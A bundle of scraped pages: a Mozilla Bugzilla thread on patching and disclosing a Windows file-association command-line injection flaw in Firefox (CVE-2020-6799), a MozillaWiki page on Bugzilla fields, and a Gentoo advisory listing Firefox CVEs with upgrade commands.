To be clear, I don't think of this patch as the real fix for the bug, just as a stopgap until the command line changes being discussed above are in. With something like this I can only patch one method of launching Firefox with attacker-controlled command-line parameters, but there are likely others, and I can't even guarantee that I'm patching all existing file associations (because command lines might have been copied elsewhere in the registry).

[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: sec-approval?

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1606596#c28)• 5 years ago |
|  | |

Comment on [attachment 9119189](/attachment.cgi?id=9119189 "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") [[details]](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin")

[Bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin

Approved to land and request uplift.

[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: sec-approval? → sec-approval+

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1606596#c29)• 5 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/1bfc604fa210>

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1606596#c30)• 5 years ago |
|  | |

Comment on [attachment 9119189](/attachment.cgi?id=9119189 "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") [[details]](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin")

[Bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin

### Beta/Release Uplift Approval Request

* **User impact if declined**: Exposure to remote code execution at the user's privilege level upon clicking a link, provided the client machine is already configured with at least one manually created file type association.
* **Is this code covered by automated tests?**: No
* **Has the fix been verified in Nightly?**: Yes
* **Needs manual test from QE?**: No
* **If yes, steps to reproduce**:
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: I'm confident in this patch. There are some known limitations and drawbacks which are discussed in the review, but regression risk should be minimal because the patch involves a set of file association configurations that is separate from the ones the installer otherwise creates and manipulates (which include the common web page file types), so regressing those is very unlikely. It's also been manually tested by myself and the reviewer.
* **String changes made/needed**: N/A

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**: This is a sec-high bug.
* **User impact if declined**: Exposure to remote code execution at the user's privilege level upon clicking a link, provided the client machine is already configured with at least one manually created file type association.
* **Fix Landed on Version**: 74
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: I'm confident in this patch. There are some known limitations and drawbacks which are discussed in the review, but regression risk should be minimal because the patch involves a set of file association configurations that is separate from the ones the installer otherwise creates and manipulates (which include the common web page file types), so regressing those is very unlikely. It's also been manually tested by myself and the reviewer.
* **String or UUID changes made by this patch**: N/A
[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: approval-mozilla-release?
[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: approval-mozilla-esr68?
[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: approval-mozilla-beta?

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1606596#c31)• 5 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/1bfc604fa210>

Group: firefox-core-security → core-security-releaseStatus: UNCONFIRMED → RESOLVEDClosed: 5 years ago
[status-firefox74](/buglist.cgi?f1=cf_status_firefox74&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → Firefox 74

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1606596#c32)• 5 years ago |
|  | |

Comment on [attachment 9119189](/attachment.cgi?id=9119189 "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") [[details]](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin")

[Bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin

Approved for 73.0b5 so we can get some wider testing.

[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1606596#c33)• 5 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/34a98c5e4134>

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected)
[status-firefox73](/buglist.cgi?f1=cf_status_firefox73&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=fixed)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)
[tracking-firefox73](/buglist.cgi?f1=cf_tracking_firefox73&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B)
[tracking-firefox74](/buglist.cgi?f1=cf_tracking_firefox74&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox74&o1=equals&v1=%2B)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [73+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=73%2B)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1606596#c34)• 5 years ago |
|  | |

Comment on [attachment 9119189](/attachment.cgi?id=9119189 "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") [[details]](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin")

[Bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin

I'd rather not take this in a dot release, it can go out with 73 in a few weeks.

[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: approval-mozilla-release? → approval-mozilla-release-

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a1319936_580382)• 5 years ago |

[status-firefox72](/buglist.cgi?f1=cf_status_firefox72&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=wontfix)

|  | [Bogdan Maris, Desktop Test Engineering](/user_profile?user_id=458188) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a1322679_458188)• 5 years ago |

Flags: qe-verify-Whiteboard: [reporter-external] [client-bounty-form] [verif?] → [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage]

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1606596#c35)• 5 years ago |
|  | |

Comment on [attachment 9119189](/attachment.cgi?id=9119189 "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") [[details]](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin")

[Bug 1606596](/show_bug.cgi?id=1606596 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin

Approved for 68.5esr. I'm a bit worried about potential enterprise fallout, though. Mike, are you aware of anything in particular we might want to test with this before shipping in 2 weeks?

Flags: needinfo?(mozilla)
[Attachment #9119189](/attachment.cgi?id=9119189&action=edit "Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin") -
Flags: approval-mozilla-esr68? → approval-mozilla-esr68+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1606596#c36)• 5 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr68/rev/b25bc5d633fe>

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed)

|  | [Mike Kaply [:mkaply]](/user_profile?user_id=7313) |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1606596#c37)• 5 years ago |
|  | |

I honestly don't have a good sense of what this fix exactly does.

What we're going to need to do is explain it really well so we can determine if it will cause any issues.

Flags: needinfo?(mozilla)

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1606596#c38)• 5 years ago |
|  | |

The most noticeable user-visible effect of this change is that we'll be listed in the Open With dialog for every file type, but "below the fold" for types we don't claim to support (meaning you have to expand the More Apps section to see it). This is a side-effect of the actual intended fix.

The actual intended fix is to replace the registry key that the Open With dialog creates when you manually associate us with a file type we don't claim support for (`.pdf` is the most common example), which we need to do because the default command line it writes into that key is insecure. So, the other effect this patch might have is that if anyone has customized any of the values we're going to write in `HKEY_CLASSES_ROOT\Applications\firefox.exe`, then those customization will be overwritten. This includes the command line string, the default icon, and the supported file types, but not any of the more common things that tend to get customized in that key, like `NoStartPage`, so those won't be affected. The uninstaller will remove the entire key if the command line points to the copy being uninstalled, though.

I think that covers it. I know it's complicated and subtle, but `HKCR` is like that.

|  | [Mike Kaply [:mkaply]](/user_profile?user_id=7313) |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1606596#c39)• 5 years ago |
|  | |

Is that true of other browsers as well? Or is this problem unique to us, and so is the workaround?

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1606596#c40)• 5 years ago |
|  | |

The reporter here indicated that Chrome had a similar bug but patched it a few months ago, but I wasn't able to see the patch myself; see the ends of [comment 5](/show_bug.cgi?id=1606596#c5 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") and [comment 6](/show_bug.cgi?id=1606596#c6 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox").

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1606596#c41)• 5 years ago |
|  | |

I was wrong about Chrome, it has not been patched and I have opened a bug report with their team.

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1606596#c42)• 5 years ago |
|  | |

I see, thanks for doing that and reporting back.

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a1841922_578488)• 5 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage] → [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a1842090_578488)• 5 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+] → [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+] [adv-esr68.5+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=1606596#c43)• 5 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9122670) (obsolete)
— [Details](attachment.cgi?id=9122670&action=edit)

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=1606596#c44)• 5 years ago |
|  | |

Hi @Tom.

Could you please use Joshua Graham & Brendan Scarvell for credit?

This advisory text might be a little more technically accurate if you would like to use it instead (modified from the previous advisory <https://www.mozilla.org/en-US/security/advisories/mfsa2019-08/#CVE-2019-9794>):

A vulnerability was discovered where command line arguments can be injected during Firefox invocation as a shell handler for certain unsupported file types. This could be used to retrieve and execute files whose location is supplied through these command line arguments if Firefox is configured as the default handler for a given file type and the file is opened in third party application as these applications insufficiently sanitize URL data.<br>*Note: This issue only affects Windows operating systems. Other operating systems are unaffected.*

Joshua Graham & Brendan Scarvell

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=1606596#c45)• 5 years ago |
|  | |

see [comment 44](/show_bug.cgi?id=1606596#c44 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox").

Flags: needinfo?(tom)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=1606596#c46)• 5 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9122901)
— [Details](attachment.cgi?id=9122901&action=edit)

Thanks!

[Attachment #9122670](/attachment.cgi?id=9122670&action=edit "advisory.txt") -
Attachment is obsolete: trueFlags: needinfo?(tom)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a2802280_1689)• 5 years ago |

Flags: sec-bounty? → sec-bounty+Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---) → [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a3397298_578488)• 5 years ago |

Alias: CVE-2020-6799

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a6008891_159069)• 5 years ago |

Regressions: [1619122](/show_bug.cgi?id=1619122 "VERIFIED FIXED - Firefox don't listed in context menu \"open with...\" with file type .jpg extension")

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a13390813_1689)• 5 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a139137079_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1606596&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from wiki.mozilla.org_62173e84_20250119_132257.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from security.gentoo.org_984975ef_20250119_113134.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Mozilla Firefox: Multiple vulnerabilities — GLSA **202003-02**

Multiple vulnerabilities have been found in Mozilla Firefox, the
worst of which may allow execution of arbitrary code.

### Affected packages

| Package | **www-client/firefox** on all architectures |
| --- | --- |
| Affected versions | < **68.6.0** |
| Unaffected versions | >= **68.6.0** |

| Package | **www-client/firefox-bin** on all architectures |
| --- | --- |
| Affected versions | < **68.6.0** |
| Unaffected versions | >= **68.6.0** |

### Background

Mozilla Firefox is a popular open-source web browser from the Mozilla
Project.

### Description

Multiple vulnerabilities have been discovered in Mozilla Firefox. Please
review the CVE identifiers referenced below for details.

### Impact

A remote attacker could entice a user to view a specially crafted web
page, possibly resulting in the execution of arbitrary code with the
privileges of the process or a Denial of Service condition. Furthermore,
a remote attacker may be able to perform Man-in-the-Middle attacks,
obtain sensitive information, spoof the address bar, conduct clickjacking
attacks, bypass security restrictions and protection mechanisms, or have
other unspecified impact.

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Firefox users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-68.6.0"

```

All Mozilla Firefox binary users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-bin-68.6.0"

```
### References

* [CVE-2019-11745](https://nvd.nist.gov/vuln/detail/CVE-2019-11745)
* [CVE-2019-17005](https://nvd.nist.gov/vuln/detail/CVE-2019-17005)
* [CVE-2019-17008](https://nvd.nist.gov/vuln/detail/CVE-2019-17008)
* [CVE-2019-17010](https://nvd.nist.gov/vuln/detail/CVE-2019-17010)
* [CVE-2019-17011](https://nvd.nist.gov/vuln/detail/CVE-2019-17011)
* [CVE-2019-17012](https://nvd.nist.gov/vuln/detail/CVE-2019-17012)
* [CVE-2019-17016](https://nvd.nist.gov/vuln/detail/CVE-2019-17016)
* [CVE-2019-17017](https://nvd.nist.gov/vuln/detail/CVE-2019-17017)
* [CVE-2019-17022](https://nvd.nist.gov/vuln/detail/CVE-2019-17022)
* [CVE-2019-17024](https://nvd.nist.gov/vuln/detail/CVE-2019-17024)
* [CVE-2019-17026](https://nvd.nist.gov/vuln/detail/CVE-2019-17026)
* [CVE-2019-20503](https://nvd.nist.gov/vuln/detail/CVE-2019-20503)
* [CVE-2020-6796](https://nvd.nist.gov/vuln/detail/CVE-2020-6796)
* [CVE-2020-6797](https://nvd.nist.gov/vuln/detail/CVE-2020-6797)
* [CVE-2020-6798](https://nvd.nist.gov/vuln/detail/CVE-2020-6798)
* [CVE-2020-6799](https://nvd.nist.gov/vuln/detail/CVE-2020-6799)
* [CVE-2020-6800](https://nvd.nist.gov/vuln/detail/CVE-2020-6800)
* [CVE-2020-6805](https://nvd.nist.gov/vuln/detail/CVE-2020-6805)
* [CVE-2020-6806](https://nvd.nist.gov/vuln/detail/CVE-2020-6806)
* [CVE-2020-6807](https://nvd.nist.gov/vuln/detail/CVE-2020-6807)
* [CVE-2020-6811](https://nvd.nist.gov/vuln/detail/CVE-2020-6811)
* [CVE-2020-6812](https://nvd.nist.gov/vuln/detail/CVE-2020-6812)
* [CVE-2020-6814](https://nvd.nist.gov/vuln/detail/CVE-2020-6814)
* [MFSA-2019-37](https://www.mozilla.org/en-US/security/advisories/mfsa2019-37/)
* [MFSA-2020-03](https://www.mozilla.org/en-US/security/advisories/mfsa2020-03/)
* [MFSA-2020-06](https://www.mozilla.org/en-US/security/advisories/mfsa2020-06/)
* [MFSA-2020-09](https://www.mozilla.org/en-US/security/advisories/mfsa2020-09/)

**Release date**

March 12, 2020

**Latest revision**

March 12, 2020: 2

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [702638](https://bugs.gentoo.org/show_bug.cgi?id=702638)
* [705000](https://bugs.gentoo.org/show_bug.cgi?id=705000)
* [709346](https://bugs.gentoo.org/show_bug.cgi?id=709346)
* [712182](https://bugs.gentoo.org/show_bug.cgi?id=712182)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from www.mozilla.org_ff0f8d89_20250119_113134.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

